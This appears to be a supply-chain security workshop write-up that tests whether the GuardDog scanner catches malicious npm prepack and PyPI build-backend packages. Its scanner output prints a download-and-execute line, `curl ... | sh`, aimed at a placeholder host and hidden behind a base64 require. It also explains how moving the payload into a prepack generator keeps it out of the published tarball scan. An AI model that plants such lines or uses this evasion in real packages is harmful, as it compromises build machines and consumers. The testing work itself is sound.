# T08 — GuardDog / S05 + S03

## The question

Part 2 showed that metadata-only scanners miss code that a build generates or
transforms. GuardDog reads the code itself, so it is the fair test of whether
"read the actual bytes" closes that gap. Use it to distinguish:

```text
what the artefact contains
what a code-reading heuristic can see in those contents
what a clean result actually means
```

The central question:

> When a scanner reads the code rather than the metadata, does a clean result
> mean the package is safe, or only that nothing detectable was in the bytes
> it was handed?

## The instrument

[GuardDog](https://github.com/DataDog/guarddog) (Datadog, Apache-2.0) is a
malicious-package scanner for npm, PyPI, Go, RubyGems, GitHub Actions and
editor extensions. It works two ways: **source-code heuristics** (Semgrep and
YARA rules over the package's actual code, looking for obfuscation, download-
and-execute, install hooks, exfiltration) and **metadata heuristics**
(typosquatting, expired maintainer domains, and the like).

```text
guarddog 3.2.0
python  3.11.15
```

GuardDog expects a kernel-level sandbox that most laptops cannot provide. The
source-code heuristics run identically without it, so every command here
passes `--no-sandbox`. That flag lowers isolation, not detection.

# Calibration — prove the scanner fires

Every probe below returns either a risk score or a clean one, and a clean
result is only meaningful once you know the tool is awake. So the control
comes first: it is not a probe of the scenarios, it is the calibration that
makes their clean results interpretable.

## Run

```command
./scripts/positive-control.sh
```

The script writes a deliberately malicious package (never installed, never
published) with two obvious tells: a `preinstall` hook, and an `index.js` that
base64-hides `child_process` and runs a download-and-execute.

## Observed

```output
── Initial execution ──

execution-risk: found 1 indicator
│ * threat.process.spawn
│   Detects download-and-execute patterns: fetching a remote file then executing it
│   at index.js:3
│     const cp = require(_p);
│     cp.exec("curl -s http://malicious.example.tld/payload.sh | sh");

Assessment:  High risk  (8.2/10)
```

## What this pins down

GuardDog resolves the base64-obscured `require`, follows it to the `exec`, and
scores the package **8.2/10**. The scanner reads code and reacts to it. From
here, a `0.0/10` means "nothing matched", not "nothing ran".

# Probe 1 — the S05 published tarball

## Question

S05 ships a package whose `dist/` was generated by a `prepack` hook. Can a
code-reading scanner see that mechanism in the tarball a consumer receives?

## Expectation

Ground truth from S05: `files: ["dist"]` restricts the tarball to the
generated output, so the generator script itself never ships — only its result
and the `prepack` declaration that names it. A code reader cannot flag code it
is not handed, so the scan should come back clean — and that clean should say
nothing about what the generator did.

## Run

```command
./scripts/scan-s05.sh
```

## Observed

The tarball a consumer actually receives contains exactly:

```output
package/dist/index.js
package/package.json
package/dist/prepack-evidence.json
```

Its `package.json` still declares the generator:

```json
"scripts": {
  "prepack": "node scripts/generate-dist.js"
}
```

GuardDog's verdict:

```text
No risks found in trace-route-package-1.0.0.tgz
Assessment:  No risks detected  (0.0/10)
```

## Verdict

**Silent (0.0/10) — correctly, and uselessly.** Read the tarball listing
against the declaration. The package announces a `prepack` step that runs
`scripts/generate-dist.js`, and that file **is not in the tarball**: S05's
`files: ["dist"]` shipped the generated output and left the generator behind.
What reaches GuardDog is the *result* of a build step plus a reference to a
generator it will never see.

So the clean score is honest and useless at the same time. GuardDog flagged
nothing because there was nothing to flag: the mechanism you watched execute
in S05/T07 was packaged out of existence. This is Part 2's lesson in a new
tool: transformation destroys the evidence, and a scanner cannot report the
absence of what it cannot see.

# Probe 2 — the S03 source distribution

## Question

S03's sdist carries its own PEP 517 build backend — code that runs during
`pip install`. When the mechanism *does* ship, what does a code reader make of
it?

## Expectation

Ground truth from S03: the sdist includes `tracehook_backend.py`, and
`pyproject.toml` names it as the build backend, so this time the executable
mechanism is in the bytes GuardDog is handed. The backend is genuinely benign
— it builds a wheel, which is its job — so the honest expectation is another
clean result, but for the opposite reason to Probe 1: evidence present and
innocent, rather than evidence absent.

## Run

```command
./scripts/scan-s03.sh
```

## Observed

Unlike the S05 tarball, the S03 sdist carries its build logic:

```output
tracehook_demo-1.0.0/pyproject.toml
tracehook_demo-1.0.0/tracehook_backend.py
```

`pyproject.toml` names that file as the build backend:

```toml
[build-system]
requires = []
build-backend = "tracehook_backend"
backend-path = ["."]
```

GuardDog's verdict:

```text
No risks found in tracehook_demo-1.0.0.tar.gz
Assessment:  No risks detected  (0.0/10)
```

The JSON output confirms this is a real evaluation, not a skipped one: every
capability and threat rule ran and returned empty (`evidence/s03-pypi-scan.json`).

## Verdict

**Silent (0.0/10) — the evidence was present, read, and genuinely benign.**
This clean result is a different animal from Probe 1. The backend that runs
during `pip install`, the code that generates the package you actually
import, is **right there in the sdist**, and GuardDog read it. It found
nothing because there is nothing: `tracehook_backend.py` builds a wheel with
`json`, `base64` and `zipfile`, which is exactly what a legitimate PEP 517
backend does. No heuristic can separate a benign build backend from a
malicious one on the strength of "it writes files during the build", because
writing files during the build is the job.

So Probe 1 is clean because the evidence is absent; Probe 2 is clean because
the evidence is present and genuinely benign. The score is `0.0/10` both times.

# Probe 3 — the malicious variant, payload in the generator

## Question

The scans so far were of benign fixtures. This probe turns S05's `prepack`
mechanism malicious with the payload in the *generator*: does the scanner
catch an attack whose code never reaches the artefact?

The variant lives beside the scenario, in
[`scenarios/S05-node-prepack/malicious-variant`](../../scenarios/S05-node-prepack/malicious-variant/README.md).
Its payload is a harmless stand-in: an async `curl | sh` to a reserved
`.invalid` host that can never resolve. Nothing here is installed, run, or
published; it is packed and scanned, nothing more.

## Expectation

The calibration proved GuardDog fires on exactly this download-and-execute
pattern. Ground truth from Probe 1: `files: ["dist"]` keeps the generator out
of the tarball. Put together: a scan of the *published tarball* should stay
silent even though the attack is real, and a scan of the *source*, where the
generator still exists, should fire.

## Run

```command
./scripts/scan-malicious.sh
```

The script scans both malicious cases; this probe reads Case A, where
`scripts/generate-dist.js` carries the `curl | sh`. That code runs at
`prepack`, on whoever *publishes* the package.

## Observed

Scan the published tarball:

```output
No risks found in CASE-A-generator-payload.tgz
Assessment:  No risks detected  (0.0/10)
```

Clean. Now scan the *source*, where the generator still exists:

```text
execution-risk: found 1 indicator
│ * threat.process.spawn
│   Detects download-and-execute patterns: fetching a remote file then executing it
│   at scripts/generate-dist.js:9
Assessment:  High risk  (8.2/10)
```

## Verdict

**Tarball: silent (0.0/10). Source: fired (8.2/10).** Same package, opposite
verdicts. The attack is real and GuardDog can see it, but only from the
source. Publishing packaged the evidence out, exactly as the benign S05
tarball did in Probe 1. And note who this attack even targets: it runs at pack
time, so its victim is the *build machine*, and the artefact a consumer
downloads carries no sign of it at all.

# Probe 4 — the malicious variant, payload in the generated output

## Question

Same mechanism, other placement: the generator is unremarkable but *writes*
the payload into the output that ships. Does the artefact scan catch it now?

## Expectation

In this case the malicious line rides into `dist/index.js`, which `files:
["dist"]` ships. The payload is therefore in the bytes the tarball scan is
handed, and the calibration says GuardDog fires on this pattern — so this
time the published-tarball scan should catch it.

## Run

```command
./scripts/scan-malicious.sh
```

The same script's Case B: the generator writes the `curl | sh` into
`dist/index.js`, and that file ships.

## Observed

Scan the published tarball:

```output
execution-risk: found 1 indicator
│ * threat.process.spawn
│   Detects download-and-execute patterns: fetching a remote file then executing it
│   at package/dist/index.js:4
Assessment:  High risk  (8.2/10)
```

## Verdict

**Fired (8.2/10).** The payload rode into the shipped `dist/` and now targets
the *consumer*, and because it survived into the artefact, a scan of the
artefact finds it.

The two attacks share the mechanism; where the payload sits decides detection:

```text
payload in generator   → runs at pack time, hits the PUBLISHER,  absent from tarball  → tarball scan MISSES
payload in generated   → runs on load,      hits the CONSUMER,   present in tarball   → tarball scan CATCHES
```

Scanning the published artefact is exactly the right move for the
consumer-facing attack and completely blind to the publisher-facing one. The
prepack mechanism lets the attacker choose which, and the tarball only ever
carries evidence of one of them.

# Scorecard

What GuardDog scored, target by target — `fired` means a threat indicator
matched; `silent` means no rule matched the bytes it was handed. Read the
third column before trusting either.

| Target | GuardDog | Why |
| --- | --- | --- |
| positive control | fired 8.2 | mechanism present AND matches a pattern |
| S05 tarball | silent 0.0 | mechanism absent, nothing to judge |
| S03 sdist | silent 0.0 | mechanism present, benign, correctly cleared |
| malicious A, tarball | silent 0.0 | generator excluded from tarball — missed |
| malicious A, source | fired 8.2 | generator present — caught |
| malicious B, tarball | fired 8.2 | payload shipped in dist — caught |

A code-reading scanner is a real step up from a metadata one: the control, the
benign fixtures and the shipped payload all get exactly the verdict they
deserve. But look at the three `silent 0.0` rows against the caught ones. A
single clean number covers "benign", "nothing shipped here", and "the attack
is in the half we didn't scan". Only the artefact contents, read alongside the
score, tell you which clean you are holding.

One more limit, stated plainly: GuardDog has no Java ecosystem, so it cannot
scan S04's Maven JAR at all. The hidden-endpoint mechanism from S04 is outside
its reach not because the evidence is missing but because the language is.
Every tool has a boundary; this workshop's whole method is knowing which
boundary you are standing on.

# Findings

## What this proves

```text
reading code beats reading metadata
a clean result still is not a safety proof
"no risk detected" can mean absent evidence OR benign evidence
```

## What this does NOT prove

That GuardDog is weak. It earned every verdict: it flagged the malicious
control, caught the malicious variant wherever the payload actually shipped,
and declined to invent findings in packages that had none. The gap is
structural, the same one every part of this workshop keeps meeting: a tool
answers for the evidence at its own boundary, and a score is not the same
thing as the truth behind it.

---

# Final verdict

The central question was whether a clean result from a code-reading scanner
means the package is safe. The probes answer: no — it means nothing detectable
was in the bytes the scanner was handed. Probe 1's clean hid an absent
mechanism, Probe 2's clean cleared a present and benign one, and Probe 3's
clean sat on top of a real attack whose evidence had been packaged out. The
score alone cannot distinguish the three; the artefact contents can.
